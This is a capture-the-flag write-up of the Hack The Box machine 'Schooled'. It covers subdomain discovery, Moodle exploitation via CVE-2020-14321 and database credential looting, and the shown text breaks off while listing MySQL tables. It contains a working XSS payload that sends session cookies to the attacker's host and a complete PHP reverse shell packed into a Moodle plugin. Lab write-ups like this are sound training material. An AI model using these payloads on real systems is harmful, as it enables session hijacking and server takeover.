# Introduction

[![](https://www.hackthebox.eu/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png)](https://app.hackthebox.eu/machines/335)

| Point | Description |
| :------:| :------: |
| Name | Schooled  |
| OS   | FreeBSD  |
| Difficulty Rating| Medium   |
| Release | 03 Apr 2021   |
| IP | 10.10.10.234   |
| Owned | 28 Apr 2021 |

# Short retelling

* Find subdomain
* Use XSS to steel teacher's cookie
* Privilege escalation from teatcher to administrator of site with CVE
* Upload PHP reverse shell
* Find credentional to connect to mysql databases
* Crack bcrypt hash
* Get user.txt
* Create custom FreeBSD package
* Install it to get RCE
* Get root.txt

# Enumeration

## Nmap

Let's start reconing machine "Schooled" 10.10.10.234 with Nmap

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# nmap -sV -p- -sC 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 01:39 EDT
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.28s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=4/29%Time=608A4A0B%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 927.00 seconds

```

After reconnig we get 3 ports: 22/TCP SSH, 80/TCP HTTP, 33060/tcp mysql.

Let's start exploring web site.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132255.png)

It's site of education programm. 

Finding some info about prospective users.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132333.png)

Also we see interesting page *schooled.htb/contact.html*. Trying to exploit CSRF, SSTI, SQL Inj. Every time we get 404 Error when trying to get a quote.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132433.png)

There isn't something interesting in the source code too.

## Gobuster

Let's try to find something interesting in direcories of web server.

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# gobuster dir -e -u http://Schooled.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,301,302
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Schooled.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     rar,tar,html,phtml,zip,js,php,txt,htm
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/04/30 00:49:43 Starting gobuster
===============================================================
http://Schooled.htb/about.html (Status: 200)
http://Schooled.htb/contact.html (Status: 200)
http://Schooled.htb/css (Status: 301)
http://Schooled.htb/fonts (Status: 301)
http://Schooled.htb/images (Status: 301)
http://Schooled.htb/index.html (Status: 200)
http://Schooled.htb/index.html (Status: 200)
http://Schooled.htb/js (Status: 301)
===============================================================
2021/04/30 01:07:38 Finished
===============================================================
```

And we get no result. There isn't any credentials in these direcories.

## ffuf

Let's try to find subdomains of web server.

```
┌──(root💀kali)-[/home/kali]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://schooled.htb/ -H "Host:FUZZ.schooled.htb" -fw 5338

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://schooled.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.schooled.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 5338
________________________________________________

moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
:: Progress: [114441/114441] :: Job [1/1] :: 144 req/sec :: Duration: [0:13:04] :: Errors: 0 ::
```

And we find out about the subdomain *moodle*. Add `moodle.schooled.htb` to /etc/hosts.

Let's see on this web page.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132628.png)

We see four available courses and form to log in.

# Explotation

> *Moodle* is used for blended learning, distance education, flipped classroom and other e-learning projects in schools, universities, workplaces and other sectors.
it is used to create private websites with online courses for educators and trainers to achieve learning goals.[10][11] Moodle allows for extending and tailoring learning environments using community-sourced plugins.

Let's create our account.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132822.png)

After register and login we can enroll to course Mathematics of teacher Manuel Phillips.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132928.png)

In the course we see two messages

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133008.png)

One of messages is interesting...

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133038.png)

Ok, I think we need to start searching some CVE for *moodle*.

* https://www.cybersecurity-help.cz/vdb/SB2020072004
* https://www.cybersecurity-help.cz/vulnerabilities/31682/

First link says us about XSS attacks (A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website.). 

Second link says that remote authenticated attacker with teacher permission can escalate privileges from teacher role into manager role.

Also I find [POC](https://www.youtube.com/watch?v=BkEInFI4oIU) for CVE-2020-14321 and [profile of github](https://github.com/HoangKien1020/CVE-2020-14321) with this payload.

We knows that teacher will check links of MoodleNet in student's profiles form the message *Reminder for joining students*.

We can steel cookie's teacher with XSS attack. There is the good [article](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md) about it.

Let's edit our profile and use this XSS. `<script>var i=new Image;i.src="http://10.10.14.73:8000/?"+document.cookie;</script>`

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134009.png)

Starting local http server and getting teacher's cookie.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.73 - - [01/May/2021 02:44:10] "GET /?MoodleSession=02qscopk1nmvgvngqlogkkle2n HTTP/1.1" 200 -
10.10.10.234 - - [01/May/2021 02:45:16] "GET /?MoodleSession=na6bmqb1fb3soej8k7rdlflv9m HTTP/1.1" 200 -
```

Now we need to replace our cookie with this. 

In Firefox we nedd to select *Inspect Elemet*, go to *Storage* and replace *cookie*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134909.png)

Reload current page and our profile becomes profile of teacher Manuel Philips.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_134943.png)

Ok, now we are the teacher in *moodle*, so we will do same like in [video](https://www.youtube.com/watch?v=BkEInFI4oIU) to get RCE.

1. We need to go to our course *Math* and select *Participants*. Next step we enroll user with manager role (we remember,that Liane Carter is manager). In the end we intercept the request in burp forward it to repeater and change the user_ID and Assign_ID of Teacher(Manuel Phillips) to become admin and forward the request to enroll Manager.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140027.png)

And teacher becomes manager.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140353.png)

We select *login as Administrator* and our teacher becomes *Admin*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_140720.png)

2. Now we need to get RCE. Going to *Users* -> *Permissions* -> *Define Roles*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_142006.png)

And edit manager's role. We need to intercept the request in burp when we click *Save changes* and replace it on [payload](https://github.com/HoangKien1020/CVE-2020-14321)

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)

After this we need to go plugins and dowload our payload.

We download payload from this [link](https://github.com/HoangKien1020/Moodle_RCE), unzip it replae php web shell wuth php reverse shell and zip it again.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# cd Moodle_RCE  
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# ls
rce  rce.zip  README.md
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# rm rce.zip
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# cd rce/lang/en 
                                                                                                                                                                           
┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
└─# ls
block_rce.php                                                                                                                                                                  
                                                                                                                                                                          
┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
└─# cat block_rce.php                                                                                                                                                130 ⨯
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.73';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
                                                                                                                                                                           
┌──(root💀kali)-[/home/…/Moodle_RCE/rce/lang/en]
└─# cd /home/kali/HTB/Schooled/Moodle_RCE 
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# ls
rce  README.md
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# zip -r rce.zip rce
  adding: rce/ (stored 0%)
  adding: rce/lang/ (stored 0%)
  adding: rce/lang/en/ (stored 0%)
  adding: rce/lang/en/block_rce.php (deflated 65%)
  adding: rce/version.php (deflated 11%)
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled/Moodle_RCE]
└─# ls
rce  rce.zip  README.md
```

In *Plugins* select *Install Plugins* and upload our rce.zip

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)

Start listener. Select *Continue*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_143226.png)

And we get Reverse Shell

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# nc -lvp 4444      
listening on [any] 4444 ...
connect to [10.10.14.73] from schooled.htb [10.10.10.234] 17063
FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
 8:47AM  up 14:17, 0 users, load averages: 0.75, 0.71, 0.71
USER       TTY      FROM    LOGIN@  IDLE WHAT
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
$ hostname
Schooled
$ pwd
/
```

# Privilege Escalation#1

Ok, I can't upgrade my reverse shell and can't use wget or netcat. So we will find some credentials manually.

I think we should to find moodle's directory.

```
$ locate moodle
/usr/local/www/apache24/data/moodle
```

Let's check the directory...

```
$ cd /usr/local/www/apache24/data/moodle 
$ ls
CONTRIBUTING.txt
COPYING.txt
Gruntfile.js
GruntfileComponents.js
INSTALL.txt
PULL_REQUEST_TEMPLATE.txt
README.txt
TRADEMARK.txt
admin
analytics
auth
availability
babel-plugin-add-module-to-define.js
backup
badges
behat.yml.dist
blocks
blog
brokenfile.php
cache
calendar
cohort
comment
competency
completion
composer.json
composer.lock
config-dist.php
config.php
contentbank
course
customfield
dataformat
draftfile.php
enrol
error
favourites
file.php
files
filter
githash.php
grade
group
h5p
help.php
help_ajax.php
index.php
install
install.php
iplookup
lang
lib
local
login
media
message
mnet
mod
my
notes
npm-shrinkwrap.json
package.json
phpunit.xml.dist
pix
plagiarism
pluginfile.php
portfolio
privacy
question
rating
report
repository
rss
search
tag
theme
tokenpluginfile.php
user
userpix
version.php
webservice
$ 
```

And we find many files in this directory. Let's try to find some credentials here.

In the file *config.php* we find credentials for connection to mysql.

```
$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```

Let's connect to mysql

```
$ mysql -u moodle -pPlaybookMaster2020 -e'show databases'
/bin/sh: mysql: not found
$ which mysql
$ whereis mysql
mysql: /usr/local/man/man1/mysql.1.gz
$ locate mysql
/usr/local/bin/mysql
```

MySQL has wrong location.

```
$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show databases'
mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
moodle
$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; show tables'
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_moodle
mdl_analytics_indicator_calc
mdl_analytics_models
mdl_analytics_models_log
mdl_analytics_predict_samples
mdl_analytics_prediction_actions
mdl_analytics_predictions
mdl_analytics_train_samples
mdl_analytics_used_analysables
mdl_analytics_used_files
mdl_assign
mdl_assign_grades
mdl_assign_overrides
mdl_assign_plugin_config
mdl_assign_submission
mdl_assign_user_flags
mdl_assign_user_mapping
mdl_assignfeedback_comments
mdl_assignfeedback_editpdf_annot
mdl_assignfeedback_editpdf_cmnt
mdl_assignfeedback_editpdf_queue
mdl_assignfeedback_editpdf_quick
mdl_assignfeedback_editpdf_rot
mdl_assignfeedback_file
mdl_assignment
mdl_assignment_submissions
mdl_assignment_upgrade
mdl_assignsubmission_file
mdl_assignsubmission_onlinetext
mdl_auth_oauth2_linked_login
mdl_backup_controllers
mdl_backup_courses
mdl_backup_logs
mdl_badge
mdl_badge_alignment
mdl_badge_backpack
mdl_badge_backpack_oauth2
mdl_badge_criteria
mdl_badge_criteria_met
mdl_badge_criteria_param
mdl_badge_endorsement
mdl_badge_external
mdl_badge_external_backpack
mdl_badge_external_identifier
mdl_badge_issued
mdl_badge_manual_award
mdl_badge_related
mdl_block
mdl_block_instances
mdl_block_positions
mdl_block_recent_activity
mdl_block_recentlyaccesseditems
mdl_block_rss_client
mdl_blog_association
mdl_blog_external
mdl_book
mdl_book_chapters
mdl_cache_filters
mdl_cache_flags
mdl_capabilities
mdl_chat
mdl_chat_messages
mdl_chat_messages_current
mdl_chat_users
mdl_choice
mdl_choice_answers
mdl_choice_options
mdl_cohort
mdl_cohort_members
mdl_comments
mdl_competency
mdl_competency_coursecomp
mdl_competency_coursecompsetting
mdl_competency_evidence
mdl_competency_framework
mdl_competency_modulecomp
mdl_competency_plan
mdl_competency_plancomp
mdl_competency_relatedcomp
mdl_competency_template
mdl_competency_templatecohort
mdl_competency_templatecomp
mdl_competency_usercomp
mdl_competency_usercompcourse
mdl_competency_usercompplan
mdl_competency_userevidence
mdl_competency_userevidencecomp
mdl_config
mdl_config_log
mdl_config_plugins
mdl_contentbank_content
mdl_context
mdl_context_temp
mdl_course
mdl_course_categories
mdl_course_completion_aggr_methd
mdl_course_completion_crit_compl
mdl_course_completion_criteria
mdl_course_completion_defaults
mdl_course_completions
mdl_course_format_options
mdl_course_modules
mdl_course_modules_completion
mdl_course_published
mdl_course_request
mdl_course_sections
mdl_customfield_category
mdl_customfield_data
mdl_customfield_field
mdl_data
mdl_data_content
mdl_data_fields
mdl_data_records
mdl_editor_atto_autosave
mdl_enrol
mdl_enrol_flatfile
mdl_enrol_lti_lti2_consumer
mdl_enrol_lti_lti2_context
mdl_enrol_lti_lti2_nonce
mdl_enrol_lti_lti2_resource_link
mdl_enrol_lti_lti2_share_key
mdl_enrol_lti_lti2_tool_proxy
mdl_enrol_lti_lti2_user_result
mdl_enrol_lti_tool_consumer_map
mdl_enrol_lti_tools
mdl_enrol_lti_users
mdl_enrol_paypal
mdl_event
mdl_event_subscriptions
mdl_events_handlers
mdl_events_queue
mdl_events_queue_handlers
mdl_external_functions
mdl_external_services
mdl_external_services_functions
mdl_external_services_users
mdl_external_tokens
mdl_favourite
mdl_feedback
mdl_feedback_completed
mdl_feedback_completedtmp
mdl_feedback_item
mdl_feedback_sitecourse_map
mdl_feedback_template
mdl_feedback_value
mdl_feedback_valuetmp
mdl_file_conversion
mdl_files
mdl_files_reference
mdl_filter_active
mdl_filter_config
mdl_folder
mdl_forum
mdl_forum_digests
mdl_forum_discussion_subs
mdl_forum_discussions
mdl_forum_grades
mdl_forum_posts
mdl_forum_queue
mdl_forum_read
mdl_forum_subscriptions
mdl_forum_track_prefs
mdl_glossary
mdl_glossary_alias
mdl_glossary_categories
mdl_glossary_entries
mdl_glossary_entries_categories
mdl_glossary_formats
mdl_grade_categories
mdl_grade_categories_history
mdl_grade_grades
mdl_grade_grades_history
mdl_grade_import_newitem
mdl_grade_import_values
mdl_grade_items
mdl_grade_items_history
mdl_grade_letters
mdl_grade_outcomes
mdl_grade_outcomes_courses
mdl_grade_outcomes_history
mdl_grade_settings
mdl_grading_areas
mdl_grading_definitions
mdl_grading_instances
mdl_gradingform_guide_comments
mdl_gradingform_guide_criteria
mdl_gradingform_guide_fillings
mdl_gradingform_rubric_criteria
mdl_gradingform_rubric_fillings
mdl_gradingform_rubric_levels
mdl_groupings
mdl_groupings_groups
mdl_groups
mdl_groups_members
mdl_h5p
mdl_h5p_contents_libraries
mdl_h5p_libraries
mdl_h5p_libraries_cachedassets
mdl_h5p_library_dependencies
mdl_h5pactivity
mdl_h5pactivity_attempts
mdl_h5pactivity_attempts_results
mdl_imscp
mdl_label
mdl_lesson
mdl_lesson_answers
mdl_lesson_attempts
mdl_lesson_branch
mdl_lesson_grades
mdl_lesson_overrides
mdl_lesson_pages
mdl_lesson_timer
mdl_license
mdl_lock_db
mdl_log
mdl_log_display
mdl_log_queries
mdl_logstore_standard_log
mdl_lti
mdl_lti_access_tokens
mdl_lti_submission
mdl_lti_tool_proxies
mdl_lti_tool_settings
mdl_lti_types
mdl_lti_types_config
mdl_ltiservice_gradebookservices
mdl_message
mdl_message_airnotifier_devices
mdl_message_contact_requests
mdl_message_contacts
mdl_message_conversation_actions
mdl_message_conversation_members
mdl_message_conversations
mdl_message_email_messages
mdl_message_popup
mdl_message_popup_notifications
mdl_message_processors
mdl_message_providers
mdl_message_read
mdl_message_user_actions
mdl_message_users_blocked
mdl_messageinbound_datakeys
mdl_messageinbound_handlers
mdl_messageinbound_messagelist
mdl_messages
mdl_mnet_application
mdl_mnet_host
mdl_mnet_host2service
mdl_mnet_log
mdl_mnet_remote_rpc
mdl_mnet_remote_service2rpc
mdl_mnet_rpc
mdl_mnet_service
mdl_mnet_service2rpc
mdl_mnet_session
mdl_mnet_sso_access_control
mdl_mnetservice_enrol_courses
mdl_mnetservice_enrol_enrolments
mdl_modules
mdl_my_pages
mdl_notifications
mdl_oauth2_access_token
mdl_oauth2_endpoint
mdl_oauth2_issuer
mdl_oauth2_system_account
mdl_oauth2_user_field_mapping
mdl_page
mdl_portfolio_instance
mdl_portfolio_instance_config
mdl_portfolio_instance_user
mdl_portfolio_log
mdl_portfolio_mahara_queue
mdl_portfolio_tempdata
mdl_post
mdl_profiling
mdl_qtype_ddimageortext
mdl_qtype_ddimageortext_drags
mdl_qtype_ddimageortext_drops
mdl_qtype_ddmarker
mdl_qtype_ddmarker_drags
mdl_qtype_ddmarker_drops
mdl_qtype_essay_options
